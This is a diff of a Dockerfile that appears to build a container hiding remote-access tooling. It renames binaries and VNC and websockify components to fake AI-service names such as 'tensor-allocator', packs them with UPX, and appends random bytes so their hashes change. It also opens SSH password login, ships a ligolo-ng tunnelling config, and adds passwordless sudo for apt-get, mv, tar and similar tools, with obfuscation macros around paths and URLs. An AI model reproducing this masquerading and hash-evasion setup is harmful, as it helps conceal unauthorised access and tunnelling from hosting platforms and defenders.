@@ -9,7 +9,6 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     curl wget sudo python3 python3-pip upx openssh-server \
     git vim nano htop tmux jq unzip iputils-ping net-tools tree \
     rclone supervisor iproute2 \
-    URL_OBFUSCATE("dbus-x11 x11-xserver-utils xfce4 xfce4-goodies tigervnc-standalone-server novnc websockify libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils") \
     && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
     && echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config \
     && echo "Port 2222" >> /etc/ssh/sshd_config \
@@ -32,27 +31,9 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && chmod +x /usr/bin/tensor-allocator /usr/bin/cuda-mesh-bridge /usr/bin/system-bridge /usr/bin/gradient-optimizer /usr/bin/neural-route-controller /usr/bin/model-routing-engine \
     && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine; do \
         upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
-        head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
-    done \
-    && curl -fsSL URL_OBFUSCATE("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US") -o /tmp/pkg-bundle.tar.xz \
-    && tar -xf /tmp/pkg-bundle.tar.xz -C /opt \
-    && mv PATH_OBFUSCATE("/opt/firefox") /opt/render-engine \
-    && mv PATH_OBFUSCATE("/opt/render-engine/firefox") /opt/render-engine/data-renderer \
-    && mv PATH_OBFUSCATE("/opt/render-engine/firefox-bin") /opt/render-engine/data-renderer-bin \
-    && ln -s /opt/render-engine/data-renderer /usr/bin/data-renderer \
-    && for bin in data-renderer data-renderer-bin; do \
-        upx -1 "/opt/render-engine/$$bin" 2>/dev/null || true; \
-        head -c 32 /dev/urandom >> "/opt/render-engine/$$bin"; \
-    done \
-    && mv PATH_OBFUSCATE("/usr/bin/Xtigervnc") /usr/bin/xorg-ipc-server \
-    && ln -s /usr/bin/xorg-ipc-server PATH_OBFUSCATE("/usr/bin/Xtigervnc") \
-    && mv PATH_OBFUSCATE("/usr/bin/vncserver") /usr/bin/display-compositor \
-    && mv PATH_OBFUSCATE("/usr/bin/vncconfig") /usr/bin/display-config \
-    && mv PATH_OBFUSCATE("/usr/bin/vncpasswd") /usr/bin/session-auth-tool \
-    && mv PATH_OBFUSCATE("/usr/bin/websockify") /usr/bin/ws-relay \
-    && for bin in xorg-ipc-server display-config session-auth-tool; do \
-        upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
-        head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
+        if ! head -n 1 "/usr/bin/$$bin" | grep -q "^#!"; then \
+            head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
+        fi; \
     done \
     && rm -rf /tmp/* \
     && apt-get purge -y upx \
@@ -72,8 +53,8 @@ RUN userdel -f ubuntu && useradd -m -u 1000 -s /bin/bash user && \
     usermod -aG sudo user && \
     mkdir -p /home/user/.torch_metrics && \
     chown -R user:user /home/user/.torch_metrics && \
-    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers && \
-    echo "user ALL=(ALL) NOPASSWD: /usr/bin/neural-route-controller" >> /etc/sudoers
+    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers \
+    && echo "user ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/apt, /usr/bin/mv, /usr/bin/ln, /usr/bin/tar, /usr/bin/mkdir" >> /etc/sudoers
 
 # Create isolated virtual environments to resolve package version conflicts
 RUN uv venv /opt/venv-litellm && \
@@ -88,9 +69,6 @@ COPY --chown=user:user src/app.py /home/user/app.py
 COPY --chown=user:user src/core /home/user/core
 COPY --chown=user:user src/services /home/user/services
 COPY --chown=user:user config /home/user/config
-# ligolo-ng.yaml must live in WORKDIR (/home/user) so Viper's Search Path Mode
-# (which searches "." == /home/user) can both READ it on boot AND WRITE the
-# argon2 hash back without hitting the "not in registered search paths" panic.
 COPY --chown=user:user config/ligolo-ng.yaml /home/user/ligolo-ng.yaml
 
 USER user
